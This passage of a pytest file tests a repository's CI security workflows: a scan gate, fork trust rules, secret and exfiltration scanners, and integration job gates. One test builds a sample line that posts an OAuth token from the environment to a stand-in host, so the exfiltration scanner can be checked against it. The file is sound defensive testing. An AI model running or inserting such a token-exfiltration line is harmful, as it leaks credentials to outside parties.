    assert scan.count("--disable-nosem --metrics=off") == 2


@pytest.mark.parametrize(
    ("responses", "accepted", "polls"),
    [
        ([[{}]], True, 1),
        ([[{"status": "in_progress", "conclusion": None}], [{}]], True, 2),
        ([[], [{}]], True, 2),
        ([[]], False, 15),
        ([[{"status": "queued", "conclusion": None}]], False, 15),
        ([[{"created_at": "2026-11-12T00:00:00Z"}]], False, 15),
        ([[{"display_title": "Security Scan #8"}]], False, 15),
        ([[{"event": "pull_request"}]], False, 15),
        ([[{"event": "workflow_dispatch"}]], False, 15),
        ([[{"path": ".github/workflows/other.yml"}]], False, 15),
        ([[{"id": 2, "conclusion": "failure"}, {}]], False, 1),
        ([[{"conclusion": "failure"}, {"id": 2}]], True, 1),
    ]
    + [
        ([[{"conclusion": conclusion}]], False, 1)
        for conclusion in [
            "failure",
            "cancelled",
            "timed_out",
            "skipped",
            "neutral",
            "action_required",
        ]
    ],
)
@pytest.mark.parametrize("authenticated", [True, False])
def test_security_gate_waits_for_the_current_scan(
    monkeypatch, responses, accepted, polls, authenticated
):
    code, calls = _run_security_gate(monkeypatch, responses, authenticated=authenticated)
    assert (code == 0) == accepted
    assert calls == polls


def _run_security_gate(
    monkeypatch,
    responses,
    *,
    authenticated=True,
    updated="2026-11-13T00:00:00Z",
    pr="7",
    sha=HEAD,
    request_change=None,
):
    script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
    script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
    for key, value in {
        "REPO": "databricks/unity-gateway",
        "PR_NUMBER": pr,
        "HEAD_SHA": sha,
        "PR_UPDATED_AT": updated,
        "GH_TOKEN": "test-token" if authenticated else "",
        "GITHUB_API_URL": "https://api.github.com",
    }.items():
        monkeypatch.setenv(key, value)
    scan = {
        "id": 1,
        "path": ".github/workflows/security-scan.yml",
        "display_title": "Security Scan for CI run 42",
        "event": "workflow_run",
        "head_sha": "b" * 40,  # The trusted workflow runs at main, not the PR head.
        "created_at": "2026-11-13T00:00:00Z",
        "status": "completed",
        "conclusion": "success",
        "html_url": "https://example/scan/1",
        "pull_requests": [],  # GitHub can omit PR associations on fork runs.
    }
    request = {
        "id": 42,
        "path": ".github/workflows/ci.yml",
        "display_title": "CI #7",
        "event": "pull_request",
        "head_sha": HEAD,
        "created_at": "2026-11-13T00:00:00Z",
    } | (request_change or {})
    calls = {"request": 0, "scan": 0}

    def pages(which, index):
        changes = responses[min(index, len(responses) - 1)]
        runs = [request] if which == "request" else [scan | change for change in changes]
        return [
            {"workflow_runs": [scan | {"path": "other.yml"}] * 100},
            {"workflow_runs": runs},
        ]

    def endpoint_kind(endpoint):
        if endpoint == (
            f"repos/databricks/unity-gateway/actions/runs?event=pull_request&head_sha={sha}&per_page=100"
        ):
            return "request"
        assert endpoint == (
            "repos/databricks/unity-gateway/actions/workflows/security-scan.yml/runs"
            "?event=workflow_run&created=%3E%3D2026-11-13T00:00:00Z&per_page=100"
        )
        return "scan"

    def fetch(args, timeout):
        assert authenticated, "Fork gates must not use authenticated gh"
        assert args[:2] == ["gh", "api"] and args[3:] == ["--paginate", "--slurp"]
        assert timeout == 30
        which = endpoint_kind(args[2])
        result = pages(which, calls[which])
        calls[which] += 1
        return json.dumps(result).encode()

    def public_fetch(url, timeout):
        assert not authenticated
        assert isinstance(url, str), "No authenticated Request headers on the public API path"
        assert timeout == 30
        endpoint, page = url.rsplit("&page=", 1)
        assert endpoint.startswith("https://api.github.com/")
        which = endpoint_kind(endpoint.removeprefix("https://api.github.com/"))
        if page == "1":
            calls[which] += 1
        return io.StringIO(json.dumps(pages(which, calls[which] - 1)[int(page) - 1]))

    monkeypatch.setattr(subprocess, "check_output", fetch)
    monkeypatch.setattr(urllib.request, "urlopen", public_fetch)
    monkeypatch.setattr("time.sleep", lambda _: None)
    with pytest.raises(SystemExit) as result:
        exec(compile(script, "security-gate.yml", "exec"), {})
    return result.value.code, max(calls.values())


@pytest.mark.parametrize(
    "change",
    [
        {"event": "push"},
        {"display_title": "CI #8"},
        {"path": ".github/workflows/other.yml"},
        {"created_at": "2026-11-12T00:00:00Z"},
        {"id": 43},  # A scan of request 42 cannot satisfy a different request.
    ],
)
def test_security_gate_rejects_a_scan_for_another_request(monkeypatch, change):
    code, calls = _run_security_gate(monkeypatch, [[{}]], request_change=change)
    assert code != 0 and calls == 15


@pytest.mark.parametrize("matches_commit", [True, False])
def test_security_gate_comment_requires_existing_scan_of_authorized_commit(
    monkeypatch, matches_commit
):
    # Comments arrive after the scan: reuse it without a PR-event freshness cutoff.
    sha = HEAD if matches_commit else "a" * 40
    code, calls = _run_security_gate(monkeypatch, [[{}]], updated="", sha=sha)
    assert (code == 0) == matches_commit
    assert calls == (1 if matches_commit else 15)


@pytest.mark.parametrize(("pr", "sha"), [("", HEAD), ("0", HEAD), ("7", ""), ("7", "main")])
def test_security_gate_rejects_missing_or_invalid_authorized_commit(monkeypatch, pr, sha):
    code, calls = _run_security_gate(monkeypatch, [[{}]], updated="", pr=pr, sha=sha)
    assert code != 0 and calls == 0


@pytest.mark.parametrize("authenticated", [True, False])
def test_security_gate_api_errors_block_ci(monkeypatch, authenticated):
    script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
    script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
    for key in ["REPO", "PR_NUMBER", "HEAD_SHA", "PR_UPDATED_AT"]:
        monkeypatch.setenv(key, "unused")
    monkeypatch.setenv("PR_NUMBER", "7")
    monkeypatch.setenv("HEAD_SHA", HEAD)
    monkeypatch.setenv("GH_TOKEN", "test-token" if authenticated else "")
    monkeypatch.setenv("GITHUB_API_URL", "https://api.github.com")

    def fail(*args, **kwargs):
        if authenticated:
            raise subprocess.CalledProcessError(1, "gh api")
        raise urllib.error.HTTPError("https://api.github.com", 403, "rate limit", {}, None)

    monkeypatch.setattr(subprocess, "check_output", fail)
    monkeypatch.setattr(urllib.request, "urlopen", fail)
    error = subprocess.CalledProcessError if authenticated else urllib.error.HTTPError
    with pytest.raises(error):
        exec(compile(script, "security-gate.yml", "exec"), {})


@pytest.mark.parametrize("status", [403, 429])
def test_security_gate_explains_public_rate_limits(monkeypatch, status):
    script = textwrap.dedent(_workflow("security-gate.yml").split("        run: |\n", 1)[1])
    script = script.removeprefix("python3 - <<'PY'\n").removesuffix("PY\n")
    for key, value in {
        "REPO": "databricks/unity-gateway",
        "PR_NUMBER": "7",
        "HEAD_SHA": HEAD,
        "PR_UPDATED_AT": "",
        "GH_TOKEN": "",
        "GITHUB_API_URL": "https://api.github.com",
    }.items():
        monkeypatch.setenv(key, value)

    def fail(*args, **kwargs):
        raise urllib.error.HTTPError(
            "https://api.github.com",
            status,
            "rate limited",
            {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1794602022"},
            None,
        )

    monkeypatch.setattr(urllib.request, "urlopen", fail)
    with pytest.raises(SystemExit, match="rate limit reached; tests remain blocked") as result:
        exec(compile(script, "security-gate.yml", "exec"), {})
    assert "Re-run failed CI jobs" in str(result.value)
    assert "1794602022" in str(result.value)


def test_required_security_verifier_uses_main_policy():
    workflow = _workflow("required-security.yml")
    assert "  pull_request:" in workflow and "  merge_group:" in workflow
    assert "uses: databricks/unity-gateway/.github/workflows/security-gate.yml@main" in workflow
    assert "secrets:" not in workflow and "cancel-in-progress:" not in workflow


@pytest.mark.parametrize(
    ("event_name", "head_repo", "hosted", "waits"),
    [
        ("pull_request", "external/fork", True, True),
        ("pull_request", "databricks/unity-gateway", True, True),
        ("issue_comment", "", False, True),
        ("merge_group", "", True, False),
        ("push", "", True, False),
        ("schedule", "", True, False),
    ],
)
def test_security_gate_runner_and_token_respect_event_trust(event_name, head_repo, hosted, waits):
    from types import SimpleNamespace

    workflow = _workflow("security-gate.yml")
    runner = re.search(r"runs-on: >-\n(.*?)\n    timeout-minutes:", workflow, re.S)[1]
    token = re.search(r"GH_TOKEN: (.*)", workflow)[1]
    condition = re.search(r"        if: (.*)", workflow)[1]
    github = SimpleNamespace(
        event_name=event_name,
        repository="databricks/unity-gateway",
        token="test-token",
        event=SimpleNamespace(
            pull_request=SimpleNamespace(
                head=SimpleNamespace(repo=SimpleNamespace(full_name=head_repo))
            )
        ),
    )

    def evaluate(expression):
        expression = expression.strip().removeprefix("${{").removesuffix("}}")
        expression = " ".join(expression.replace("&&", " and ").replace("||", " or ").split())
        return eval(expression, {"__builtins__": {}}, {"github": github, "fromJSON": json.loads})

    assert evaluate(runner) == (
        "ubuntu-latest"
        if hosted
        else {"group": "databricks-protected-runner-group", "labels": "linux-ubuntu-latest"}
    )
    assert evaluate(token) == ("" if hosted else "test-token")
    assert evaluate(condition) == waits


@pytest.mark.skipif(sys.platform == "win32", reason="the report step runs bash on Linux")
@pytest.mark.parametrize(
    ("scan_result", "integration_result", "state", "message"),
    [
        ("success", "success", "success", "Fork integration success"),
        ("success", "failure", "failure", "Fork integration failure"),
        ("failure", "skipped", "failure", "blocked by Security Scan (failure)"),
        ("cancelled", "skipped", "failure", "blocked by Security Scan (cancelled)"),
        ("skipped", "skipped", "failure", "blocked by Security Scan (skipped)"),
    ],
)
def test_fork_integration_reports_scan_failure_on_authorized_commit(
    tmp_path, scan_result, integration_result, state, message
):
    report = _workflow("fork-integration.yml").split("\n  report:\n", 1)[1]
    script = textwrap.dedent(report.split("        run: |\n", 1)[1])
    fake_gh = tmp_path / "gh"
    fake_gh.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$CALLS"\n')
    fake_gh.chmod(0o755)
    result = subprocess.run(
        ["bash", "-c", script],
        env={
            "PATH": f"{tmp_path}:{os.environ['PATH']}",
            "CALLS": str(tmp_path / "calls"),
            "GITHUB_REPOSITORY": "databricks/unity-gateway",
            "PR_NUMBER": "7",
            "SHA": HEAD,
            "RESULT": integration_result,
            "SCAN_RESULT": scan_result,
            "RUN_URL": "https://example/run",
        },
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode == 0, result.stderr
    calls = (tmp_path / "calls").read_text()
    assert f"statuses/{HEAD} -f state={state}" in calls
    assert message in calls


def test_exfil_scan_recognizes_every_ci_secret():
    # A secret a workflow injects must be one the exfil scan watches for.
    root = Path(__file__).parent.parent
    names = set()
    for path in (root / ".github/workflows").glob("*.yml"):
        names.update(
            re.findall(r"(?m)^\s+([A-Z][A-Z0-9_]*): \$\{\{[^}\n]*secrets\.", path.read_text())
        )
    credentials = sorted(
        name for name in names if not name.endswith(("_WORKSPACE", "_HOST", "_CLIENT_ID"))
    )
    scan = runpy.run_path(str(root / ".github/scripts/security-scan/exfil-scan.py"))

    assert "CLAUDE_CODE_OAUTH_TOKEN" in credentials
    assert [name for name in credentials if not scan["_SECRET"].search(name)] == []


def test_security_scan_parsers_survive_diff_and_path_tricks(tmp_path):
    # Added content must not pose as diff structure, and unusual names must not dodge the scans.
    scripts = Path(__file__).parent.parent / ".github/scripts/security-scan"
    steal = 'requests.post("https://x.example", data=os.environ["CLAUDE_CODE_OAUTH_TOKEN"])'
    quoted = '"b/donn\\303\\251es.py"'  # how git writes a non-ASCII name in a header
    diff = (
        f"diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1,2 @@\n+++ notes\n+{steal}\n"
        f"diff --git a/x {quoted}\n+++ {quoted}\n@@ -0,0 +1,2 @@\n"
        f"+# \fdiff --git a b\n+{steal}\n"
    )
    exfil = runpy.run_path(str(scripts / "exfil-scan.py"))
    assert [path for path, _ in exfil["scan_diff"](diff)[0]] == ["a.py", "données.py"]

    key = "AKIA" + "Q3EXAMPLEZ7XK2LM"  # split so the literal isn't a key
    (tmp_path / "pr.diff").write_text(f"diff --git a/n b/n\n+++ b/n\n@@ -0,0 +1 @@\n+++ {key}\n")
    secret = subprocess.run(
        [sys.executable, str(scripts / "secret-scan.py")],
        env={**os.environ, "DIFF_FILE": str(tmp_path / "pr.diff")},
        capture_output=True,
        text=True,
    )
    assert secret.returncode == 1 and "AWS access key id" in secret.stdout

    (tmp_path / "changed").write_bytes(".github/workflows/ü.yml\0".encode())
    guard = subprocess.run(
        ["bash", str(scripts / "sensitive-paths.sh")],
        env={**os.environ, "CHANGED_FILES": str(tmp_path / "changed")},
        capture_output=True,
        text=True,
    )
    assert guard.returncode == 1


def test_user_journey_gate_runs_for_in_repo_prs_or_a_member_command():
    workflow = _workflow("user-journey-test-required.yml")
    trigger = workflow.split("\non:\n", 1)[1].split("\npermissions:\n", 1)[0]

    assert "  pull_request:\n" in trigger and "  issue_comment:\n    types: [created]" in trigger
    assert "github.event.pull_request.head.repo.full_name == github.repository" in workflow
    assert "github.event.comment.body == '/user-journey-check'" in workflow
    assert MEMBER_ONLY in workflow
    assert "ref: ${{ github.event.repository.default_branch }}" in workflow
    assert "concurrency:" not in workflow.split("\njobs:\n", 1)[0]


def test_user_journey_fork_report_uses_the_evaluated_commit():
    report = _workflow("user-journey-test-required.yml").split(
        "Report the result on the fork PR", 1
    )[1]

    assert "SHA: ${{ steps.gate.outputs.sha }}" in report
    assert "repos/$GITHUB_REPOSITORY/statuses/$sha" in report
    assert "/pulls/" not in report and ".head.sha" not in report


def test_ug_review_accepts_member_comments_and_in_repo_labels_with_trusted_checkout():
    workflow = _workflow("ug-review.yml")

    assert re.search(r"(?m)^  issue_comment:\n    types: \[created\]\n", workflow)
    assert re.search(r"(?m)^on:\n  pull_request:\n    types: \[labeled\]\n", workflow)
    assert (
        'contains(fromJSON(\'["ug-review", "code-review"]\'), github.event.label.name)' in workflow
    )
    assert "github.event.pull_request.head.repo.full_name == github.repository" in workflow
    assert "pull_request_target" not in workflow
    assert "github.event.comment.body == '/ug-review'" in workflow
    assert MEMBER_ONLY in workflow
    assert "ref: ${{ github.event.repository.default_branch }}" in workflow
    assert (
        "PR_NUMBER: ${{ github.event.pull_request.number || github.event.issue.number }}"
        in workflow
    )
    assert "concurrency:" not in workflow.split("\njobs:\n", 1)[0]


def test_integration_checkouts_and_caches_are_safe_for_fork_heads():
    workflow = (Path(__file__).parent.parent / ".github/workflows/integration.yml").read_text()
    checkouts = re.findall(r"(?m)^      - uses: actions/checkout@.*\n((?:        .*\n)*)", workflow)
    caches = re.findall(r"(?m)^      - uses: astral-sh/setup-uv@.*\n((?:        .*\n)*)", workflow)

    assert checkouts and caches
    for block in checkouts:
        assert "ref: ${{ inputs.ref || github.sha }}" in block, block
        assert "persist-credentials: false" in block, block
    for block in caches:
        assert "enable-cache: ${{ inputs.ref == '' }}" in block, block


def test_windows_integration_ci_uses_shared_claude_version():
    workflow = Path(__file__).parent.parent / ".github/workflows/integration.yml"
    contents = workflow.read_text()

    assert "  CLAUDE_VERSION: ${{ inputs.claude_version || '2.1.290' }}" in contents
    assert contents.count('"--claude-version", $env:CLAUDE_VERSION,') == 2


@pytest.mark.parametrize(
    "failed_job",
    [
        "installation",
        "installation-windows",
        "headless-windows",
        "cowork-inference-windows",
        "cowork-inference-macos",
        "workspace",
        "smoke",
        "full",
        "antigravity",
        "managed",
        "codex-desktop-macos",
        "dedicated-cuj-plan",
        "dedicated-cuj",
    ],
)
@pytest.mark.parametrize("job_result", ["success", "failure", "cancelled", "skipped"])
def test_integration_ci_gate_requires_every_job(failed_job, job_result):
    workflow = Path(__file__).parent.parent / ".github/workflows/integration.yml"
    gate = workflow.read_text().split("\n  cujs:\n", 1)[1]
    script = re.search(r"          python3 - <<'PY'\n(.*?)          PY", gate, re.DOTALL)
    assert script is not None
    results = {
        job: {"result": "success"}
        for job in (
            "installation",
            "installation-windows",
            "headless-windows",
            "cowork-inference-windows",
            "cowork-inference-macos",
            "workspace",
            "smoke",
            "full",
            "antigravity",
            "managed",
            "codex-desktop-macos",
            "dedicated-cuj-plan",
            "dedicated-cuj",
        )
    }
    results[failed_job]["result"] = job_result
    result = subprocess.run(
        [sys.executable, "-c", textwrap.dedent(script.group(1))],
        env={"RESULTS": json.dumps(results)},
        capture_output=True,
        text=True,
        timeout=10,
    )
    if job_result == "success":
        assert result.returncode == 0, result.stderr
        assert "All integration jobs passed:" in result.stdout
    else:
        assert result.returncode != 0
        assert f"Integration jobs did not pass: {failed_job}" in result.stderr


def test_integration_suite_uses_only_public_process_boundaries():
    violations = []
    for path in (Path(__file__).parent / "integration").rglob("*.py"):
        for node in ast.walk(ast.parse(path.read_text())):
            modules = []
            if isinstance(node, ast.Import):
                modules = [alias.name for alias in node.names]
            elif isinstance(node, ast.ImportFrom):
                modules = [node.module or ""]
            if any(module.split(".")[0] in {"ucode", "mock", "unittest"} for module in modules):
                violations.append(f"{path.name}:{node.lineno}: imports application or test doubles")
            if isinstance(node, ast.Name) and node.id in {
                "monkeypatch",
                "MonkeyPatch",
                "Mock",
                "MagicMock",
                "patch",
                "setattr",
                "delattr",
            }:
                violations.append(f"{path.name}:{node.lineno}: uses {node.id}")
            if isinstance(node, ast.Attribute) and node.attr in {
                "MonkeyPatch",
                "Mock",
                "MagicMock",
                "mock",
                "patch",
                "skip",
                "skipif",
                "xfail",
            }:
                violations.append(f"{path.name}:{node.lineno}: uses {node.attr}")
    assert not violations, "\n".join(violations)


def test_live_integration_cases_belong_to_exactly_one_ci_agent():
    for path in (Path(__file__).parent / "integration").glob("test_*.py"):
        tree = ast.parse(path.read_text())
        module_marks = _markers(
            node
            for node in tree.body
            if isinstance(node, ast.Assign)
            and any(
                isinstance(target, ast.Name) and target.id == "pytestmark"
                for target in node.targets
            )
        )
        for node in tree.body:
            if isinstance(node, ast.FunctionDef) and node.name.startswith("test_"):
                marks = module_marks | _markers(node.decorator_list)
                if marks & {"live", "managed_fixture", "workspace_switch"}:
                    assert (
                        len(marks & {"claude", "codex", "opencode", "copilot", "antigravity"}) == 1
                    ), node.name


def test_model_discovery_cases_match_current_launch_contract():
    root = Path(__file__).parent
    seen = []
    paths = [
        *root.glob("integration/test_ug_*_model_discovery.py"),
        *root.glob("e2e_cuj/test_cuj*_model_discovery.py"),
    ]
    for path in paths:
        source = path.read_text()
        assert "UG_ENABLE_MODEL_DISCOVERY" not in source, path.name
        tree = ast.parse(source)
        # Model locations are launch-only on main, never configure options.
        for call in ast.walk(tree):
            if not isinstance(call, ast.Call):
                continue
            args = [arg.value for arg in call.args if isinstance(arg, ast.Constant)]
            if args and args[0] == "configure":
                assert "--model-location" not in args, path.name
        module_marks = _markers(
            node
            for node in tree.body
            if isinstance(node, ast.Assign)
            and any(
                isinstance(target, ast.Name) and target.id == "pytestmark"
                for target in node.targets
            )
        )
        for node in ast.walk(tree):
            if not isinstance(node, ast.FunctionDef):
                continue
            match = re.match(r"test_case_(\d{2})_", node.name)
            if match is None:
                continue
            case = int(match.group(1))
            seen.append(case)
            marks = module_marks | _markers(node.decorator_list)
            expected = {"managed_fixture"} if case <= 6 else {"live"}
            assert marks & {"managed_fixture", "live"} == expected, node.name
            assert marks & {"claude", "codex"} == ({"claude"} if case % 2 else {"codex"}), node.name
            assert not any(arg.arg == "configured" for arg in node.args.args), node.name
            for value in ast.walk(node):
                if isinstance(value, ast.Constant) and isinstance(value.value, str):
                    artifact = re.match(r"case-(\d{2})-", value.value)
                    if artifact:
                        assert int(artifact.group(1)) == case, (node.name, value.value)
    # Repository scenario numbers are consecutive, independent of the external
    # design document. Configured/fresh variants share their scenario number.
    expected_cases = set(range(1, 15))
    assert set(seen) == expected_cases
    assert len(seen) == 24
    for case in expected_cases:
        assert seen.count(case) == (1 if 7 <= case <= 10 else 2), case


@pytest.mark.parametrize("payload", [{}, {"coding_agent_configs": []}, []])
def test_unmanaged_discovery_accepts_an_empty_config_listing(payload):
    assert_no_managed_config(payload)


@pytest.mark.parametrize(
    "payload",
    [
        {"coding_agent_configs": [{"name": "coding-agent-configs/admin-policy"}]},
        [{"name": "coding-agent-configs/admin-policy"}],
    ],
)
def test_unmanaged_discovery_reports_published_config(payload):
    with pytest.raises(AssertionError, match="coding-agent-configs/admin-policy"):
        assert_no_managed_config(payload)


@pytest.mark.parametrize("payload", [None, "invalid", {"coding_agent_configs": {}}, [None]])
def test_unmanaged_discovery_rejects_malformed_config_listings(payload):
    with pytest.raises(AssertionError, match="Invalid CodingAgentConfig listing"):
        assert_no_managed_config(payload)


def test_smoke_covers_hosted_custom_oauth_and_headless_for_both_agents():
    smoke = set()
    for path in (Path(__file__).parent / "integration").glob("test_*.py"):
        for node in ast.parse(path.read_text()).body:
            if isinstance(node, ast.FunctionDef) and "smoke" in _markers(node.decorator_list):
                smoke.add(node.name)
    assert smoke == {
        "test_ug_configure_claude_databricks",
        "test_ug_configure_codex_databricks",
        "test_ug_claude_custom_oauth_cli_boots",
        "test_ug_codex_custom_oauth_cli_boots",
        "test_ug_claude_headless_prompt_argument",
        "test_ug_codex_headless_prompt_argument",
    }


def test_integration_tests_describe_the_scenario_and_expected_result():
    root = Path(__file__).parent / "integration"
    violations = []
    for path in root.rglob("test_*.py"):
        for node in ast.walk(ast.parse(path.read_text())):
            if not isinstance(node, ast.FunctionDef) or not node.name.startswith("test_"):
                continue
            description = ast.get_docstring(node) or ""
            if "Scenario:" not in description or "Expected:" not in description:
                violations.append(f"{path.name}:{node.lineno}: describe Scenario and Expected")
            if any(arg.arg == "configured" for arg in node.args.args):
                violations.append(f"{path.name}:{node.lineno}: setup must be visible in the test")
    assert not violations, "\n".join(violations)


def test_live_suites_use_fresh_id_for_random_ids():
    root = Path(__file__).parent
    helper = root / "integration/utils/evidence.py"
    offenders = [
        str(path.relative_to(root))
        for suite in ("integration", "e2e_cuj")
        for path in (root / suite).rglob("*.py")
        if path != helper and "uuid4(" in path.read_text(encoding="utf-8")
    ]
    assert not offenders, f"Use fresh_id() from integration/utils/evidence.py: {offenders}"


@pytest.mark.parametrize("job_name", ["cowork-inference-windows", "cowork-inference-macos"])
def test_cowork_ci_permissions_and_required_gate(job_name):
    jobs = _integration_jobs()
    job = jobs[job_name]
    assert "github.event_name != 'merge_group'" in job
    condition = re.search(r"(?m)^    if: (.*)$", job)
    assert condition is not None
    assert condition.group(1) == (
        "${{ github.event_name != 'merge_group' && "
        "(github.event_name != 'pull_request' || "
        "github.event.pull_request.head.repo.full_name == github.repository) }}"
    )
    assert "id-token:" not in job
    assert "continue-on-error:" not in job
    needs = re.search(r"(?m)^    needs: \[([^\]]+)\]$", jobs["cujs"])
    assert needs is not None
    assert job_name in {name.strip() for name in needs.group(1).split(",")}
    for caller in ("ci.yml", "fork-integration.yml"):
        integration = _workflow(caller).split("\n  integration:\n", 1)[1].split("\n  #", 1)[0]
        integration = re.split(r"\n  [a-z-]+:\n", integration, maxsplit=1)[0]
        assert "id-token:" not in integration


@pytest.mark.skipif(sys.platform == "win32", reason="required-e2e runs on Linux")
@pytest.mark.parametrize(
    ("event", "integration_result", "passes"),
    [
        ("pull_request", "success", True),
        ("pull_request", "failure", False),
        ("pull_request", "cancelled", False),
        ("pull_request", "skipped", False),
        ("push", "failure", False),
        ("merge_group", "skipped", True),
    ],
)
def test_required_e2e_enforces_integration_result(event, integration_result, passes):
    required = _workflow("ci.yml").split("\n  required-e2e:\n", 1)[1]
    script = required.split("        run: ", 1)[1].strip()
    result = subprocess.run(
        ["/bin/bash", "-c", script],
        env={
            **os.environ,
            "EVENT_NAME": event,
            "RESULT": "success",
            "INTEGRATION_RESULT": integration_result,
        },
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )
    assert (result.returncode == 0) is passes, result.stderr
